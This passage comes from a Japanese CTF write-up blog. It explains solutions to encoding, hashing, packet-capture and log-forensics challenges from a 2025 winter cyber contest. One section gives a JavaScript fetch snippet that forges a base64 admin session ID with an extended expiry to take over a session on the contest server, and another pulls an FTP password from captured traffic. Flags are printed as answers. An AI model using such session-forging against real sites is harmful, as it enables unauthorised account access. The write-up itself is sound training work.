+<pre tabindex="0"><code>&amp;#x55;&amp;#x63;&amp;#x61;&amp;#x6e;&amp;#x42;&amp;#x7d;
+VmFyaW91c0VuY29kaW5ncw==
+666c61677b
+</code></pre><p>最初のものは16進で表記された文字コード、2番目はbase64エンコードされた文字、最後の文字も16進で表記された文字コードです。<br>
+これらをデコードすると以下のようになります。</p>
+<pre tabindex="0"><code>UcanB
+VariousEncodings
+flag{
+</code></pre><p>順番を適切に入れ替えればフラグの完成です。</p>
+<pre tabindex="0"><code>flag{UcanBVariousEncodings}
+</code></pre><h3 id="file-integrity-of-long-hash">File Integrity of Long Hash</h3>
+<p>多数のテキストファイルが格納されたzipファイルとハッシュ値が渡されます。<br>
+いつもの各ファイルのハッシュを求めて、渡されたハッシュ値と一致するものがフラグというパターンです。<br>
+今回はハッシュ値が長いと思ったらsha512でした。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find . -type f -name <span style="color:#e6db74">&#39;flag*&#39;</span> -exec sha512sum <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><p>この結果の中から渡されたハッシュ値と一致するファイルはflag_89.txtになります。<br>
+その中身がフラグになります。</p>
+<pre tabindex="0"><code>flag{346D895B8FF3892191A645}
+</code></pre><h2 id="nw">NW</h2>
+<h3 id="頭が肝心です">頭が肝心です</h3>
+<p>.emlファイルの解析問題です。<br>
+メールのヘッダに経由したメールサーバのIPが書かれており、2番目のIPを求めるという問題です。<br>
+emlファイルの解析ツールで解析します。<br>
+今回はこれを使いました。(<a href="https://github.com/ninoseki/eml_analyzer">https://github.com/ninoseki/eml_analyzer</a>)<br>
+解析結果の一部です。<br>
+<img src="image2.png" alt="alt text"><br>
+Receivedヘッダが経由しているメールサーバが付与したIPアドレスになります。<br>
+Receivedヘッダはサーバを経由するごとにReceivedヘッダをメールサーバが付与していく仕組みになっています。<br>
+ヘッダを付与したタイムスタンプもあるので、それを参考に2番目に古いタイムスタンプを探します。<br>
+そこに書いてあるIPがフラグとなります。<br>
+この問題は試行回数が3回と限られており、内心ひやひやしながらフラグを投稿しました。</p>
+<pre tabindex="0"><code>flag{172.16.25.39}
+</code></pre><h3 id="3-way-handshake">3 Way Handshake?</h3>
+<p>ポートスキャンを行った痕跡があるキャプチャファイルが渡され、それを解析して空いているポートをポート番号の昇順で列挙する問題です。<br>
+ポートスキャンではTCPのコネクション確立が成功したかどうかで基本判断しています。<br>
+ポートが空いている場合、サーバはTCPのSYNフラグとACKフラグを立てたパケットを送信します。<br>
+なのでサーバからSYN ACKが返ってきているものがポートが空いているということになります。<br>
+以下がWiresharkのフィルタになります。</p>
+<pre tabindex="0"><code>tcp.flags.syn == 1 and tcp.flags.ack == 1
+</code></pre><p>これで出てきたパケットのサーバ側のポート番号を昇順で列挙すればフラグが完成します。</p>
+<pre tabindex="0"><code>flag{21,23,37,70,79,98,109,110,111,113,143,513,514,1025,50506}
+</code></pre><h3 id="さあ得点は">さあ得点は？</h3>
+<p>あるサービスに存在する脆弱性を悪用した攻撃を記録したキャプチャファイルが渡されます。<br>
+この中から脆弱性を特定し、そのCVEのCVSS(v2.0)スコアを求める問題です。<br>
+HTTPパケットを眺めているとbyte rangeヘッダに変なペイロードが仕込まれていることに気が付きました。<br>
+そしてHTTPレスポンスにapacheとあったので、NISTのCVE検索で以下のように検索しました。</p>
+<pre tabindex="0"><code>apache range header
+</code></pre><p>そこで出てきたCVEレコードの概要を読み、今回のペイロードと最も一致するものを探します。<br>
+CVE-2011-3192の説明に複数のrange headerを表現することでDOSを行うと書いてあったので、これだと思い、このCVEのスコアを提出したところ正解でした。</p>
+<pre tabindex="0"><code>flag{7.8}
+</code></pre><h3 id="decode">decode</h3>
+<p>複数のキャプチャファイルが渡され、この中からフラグを取り出す問題です。<br>
+まずはmergecapコマンドで1つのキャプチャファイルに結合します。<br>
+HTTPパケットを中心に見ていくと、/image.phpエンドポイントに対するリクエストが複数ありました。<br>
+レスポンスを確認すると/9j/から始まるbase64文字列がJSON形式で返されていました。<br>
+/9j/から始まるものはjpegがbase64エンコードされたものなので、全てのHTTPレスポンスの内容をbase64デコードしてjpegファイルとして抜き出していきます。<br>
+すると/image.php?filename=f1a104ee8991747892d3193d6d689d04のレスポンスのjpegにフラグが書かれていました。</p>
+<pre tabindex="0"><code>flag{c4ptur3_cat}
+</code></pre><h2 id="fr">FR</h2>
+<h3 id="露出禁止">露出禁止！</h3>
+<p>Webサーバのログファイルが渡され、その中からペイロードを推測してフラグを取り出す問題です。<br>
+ログにあるリクエストは全て/ctf/fr1/index.phpと/mypage.phpに対するリクエストでした。</p>
+<pre tabindex="0"><code>192.168.100.103 - - [10/Jul/2024:15:36:01 +0900] &#34;GET /index.php HTTP/1.1&#34; 200 424
+192.168.100.103 - - [10/Jul/2024:15:36:03 +0900] &#34;POST /auth.php HTTP/1.1&#34; 302 -
+192.168.100.103 - - [10/Jul/2024:15:36:05 +0900] &#34;GET /mypage.php?sesid=MTcyMjMxMjQxNywzLHVzZXIzCg== HTTP/1.1&#34; 200 281
+192.168.100.106 - - [10/Jul/2024:15:40:03 +0900] &#34;GET /index.php HTTP/1.1&#34; 200 424
+192.168.100.106 - - [10/Jul/2024:15:40:08 +0900] &#34;POST /auth.php HTTP/1.1&#34; 302 -
+192.168.100.106 - - [10/Jul/2024:15:40:11 +0900] &#34;GET /mypage.php?sesid=MTcyMjM0Nzk5OSw2LHVzZXI2Cg== HTTP/1.1&#34; 200 281
+...
+</code></pre><p>/mypage.phpにはなぜかクエリパラメータにセッションIDが付与されていました。<br>
+1つだけ他のと違うセッションIDがあるので、これをbase64デコードすると以下のようになります。</p>
+<pre tabindex="0"><code>1722334192,1,admin
+</code></pre><p>これをそのまま使い、/mypage.phpに行ってみるとセッションが期限切れですと言われてしまいます。<br>
+最初の数値が有効期限らしいので、これを絶対期限切れにならない数値に変えた上で再度リクエストを行います。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://fr1-prod.2025winter-cybercontest.net/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1822334192,1,admin&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">b64Payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">payload</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">baseUrl</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mypage.php?sesid=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">b64Payload</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>するとフラグがもらえました。</p>
+<pre tabindex="0"><code>flag{SessionIDsCarefully}
+</code></pre><h3 id="成功の証">成功の証</h3>
+<p>FTPパケットの中からパスワードを取得する問題です。<br>
+まずはフィルタでFTPパケットだけ抜き出します。</p>
+<pre tabindex="0"><code>ftp
+</code></pre><p>6537個目のパケットでPASS zyyzzyzyでログインを試みているパケットがあり、そのレスポンスとして認証成功のパケットが返ってきているのを発見しました。<br>
+なのでそれが正しいパスワードになります。<br>
+これは殆どのパケットに言えることなのですが、リクエストとレスポンスを見たいときはFollow TCP StreamなどのFollow機能を使うと見やすいのでおすすめです。<br>
+今回の場合だとこうなります。<br>
+<img src="image3.png" alt="alt text"></p>
+<pre tabindex="0"><code>flag{zyyzzyzy}
+</code></pre><h3 id="犯人はこの中にいる">犯人はこの中にいる！</h3>
+<p>個人的にFRの中で一番好きな問題です。<br>
+ポートスキャンが行われた痕跡のあるキャプチャファイルが渡されます。<br>
+ですが攻撃を行ったクライアントはIPを偽造しているので、本当のIPを求めるという問題です。<br>
+問題文には<code>これは内部にいる攻撃者が外部IPアドレスを偽造したものです</code>という記述があったので<br>
+攻撃者は攻撃を受けたクライアントと同一ネットワーク上にいると判断し、調査を進めていきます。<br>
+同一ネットワークならばMACアドレスは攻撃者のMACアドレスのままなので、まずはMACアドレスを確認します。</p>
+<pre tabindex="0"><code>VMware_4d:c2:33 (00:0c:29:4d:c2:33)
+</code></pre><p>Wiresharkのフィルタを用いて送信元MACがこれと同じパケットを探します。</p>
+<pre tabindex="0"><code>ether.src == 00:0c:29:4d:c2:33
+</code></pre><p>すると1つのICMPパケットがそれに該当しました。<br>
+これの送信元IPを見ると偽造されていないIPアドレスが書かれていました。<br>
+これで攻撃者のIPアドレスを求めることができました。</p>
+<pre tabindex="0"><code>flag{192.168.204.137}
+</code></pre><h3 id="chemistry">Chemistry</h3>
+<p>実行形式のファイルが渡されます。。<br>
+実行すると数値の配列を入力するよう求められます。<br>
+FLAG I AM LUCKYという文字列になる数値の配列を求める問題です。<br>
+とりあえずIDAで解析してみます。<br>
+するとhttp://fr4.2025winter-cybercontest.net/chemistry?flagSeed=数値にリクエストを送信していることが分かりました。<br>
+数値の部分にユーザが入力した数値の配列が1ずつ使われているようです。<br>
+flagSeedパラメータの値に応じて1~2の文字が返されます。<br>
+どのくらいのパターンがあるのか気になり総当たりをしてみたところ、0~118までの数値が使えることが分かりました。<br>
+あとはこれらの数値を駆使して、なんとか指定された文字列になるように数値の配列を作っていきます。<br>
+最終的にはこうなりました。</p>
+<pre tabindex="0"><code>114,47,0,53,0,95,0,71,6,19,39
+</code></pre><p>なのでこれがフラグになります。</p>
+<pre tabindex="0"><code>flag{114,47,0,53,0,95,0,71,6,19,39}
+</code></pre>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#はじめに">はじめに</a></li>
+    <li><a href="#pg">PG</a>
+      <ul>
+        <li><a href="#縮めるだけじゃダメ">縮めるだけじゃダメ</a></li>
+        <li><a href="#暗算でもできるけど">暗算でもできるけど？</a></li>
+        <li><a href="#formjacking">formjacking</a></li>
+        <li><a href="#loop-in-loop">loop in loop</a></li>
+      </ul>
+    </li>
+    <li><a href="#cy">CY</a>
+      <ul>
+        <li><a href="#エンコード方法は一つじゃない">エンコード方法は一つじゃない</a></li>
+        <li><a href="#file-integrity-of-long-hash">File Integrity of Long Hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#nw">NW</a>
+      <ul>
+        <li><a href="#頭が肝心です">頭が肝心です</a></li>
+        <li><a href="#3-way-handshake">3 Way Handshake?</a></li>
+        <li><a href="#さあ得点は">さあ得点は？</a></li>
+        <li><a href="#decode">decode</a></li>
+      </ul>
+    </li>
+    <li><a href="#fr">FR</a>
+      <ul>
+        <li><a href="#露出禁止">露出禁止！</a></li>
+        <li><a href="#成功の証">成功の証</a></li>
+        <li><a href="#犯人はこの中にいる">犯人はこの中にいる！</a></li>
+        <li><a href="#chemistry">Chemistry</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
